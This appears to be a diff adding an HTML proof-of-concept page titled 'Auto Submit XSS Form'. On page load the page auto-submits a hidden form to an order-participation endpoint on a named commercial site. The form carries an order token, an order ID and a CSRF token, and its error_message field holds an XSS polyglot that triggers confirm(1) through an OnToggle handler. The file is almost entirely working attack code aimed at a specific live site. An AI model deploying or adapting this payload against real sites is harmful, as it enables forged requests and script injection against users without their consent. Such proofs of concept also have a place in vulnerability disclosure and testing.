@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Auto Submit XSS Form</title>
+</head>
+<body>
+<form method="POST" action="https://labergerieyvesrocher.secretbox.fr/order/link-to-participate/accept?token=6798437a874c3" id="csrfForm">
+    <input type="hidden" name="apyfundjar_participate_form[error_message]" value="&apos;&quot;1&lt;!--&gt;&lt;/Title/&lt;/Textarea/&lt;/Script/&gt;&lt;/Iframe&gt;&lt;Details/Open/OnToggle=(confirm)(1)--&gt;">
+    <input type="hidden" name="apyfundjar_participate_form[order_token]" value="6798437a874c3">
+    <input type="hidden" name="apyfundjar_participate_form[order_id]" value="639">
+    <input type="hidden" name="apyfundjar_participate_form[_token]" value="FuXnNwxx-l-DiJtYwhpvPBfPrh0NLhYVsaQAtZn3EvY">
+    <input type="hidden" name="apyfundjar_participate_form[participant_firstname]" value="">
+    <input type="hidden" name="apyfundjar_participate_form[participant_lastname]" value="">
+    <input type="hidden" name="apyfundjar_participate_form[participant_email]" value="">
+    <input type="hidden" name="apyfundjar_participate_form[payment-module]" value="31">
+    <input type="hidden" name="apyfundjar_participate_form[participation_amount]" value="1">
+    <input type="hidden" name="apyfundjar_participate_form[cgv_agrement]" value="1">
+    <input type="hidden" name="apyfundjar_participate_form[privacy-policy]" value="1">
+</form>
+    <script>
+        // Automatically submit the form
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>
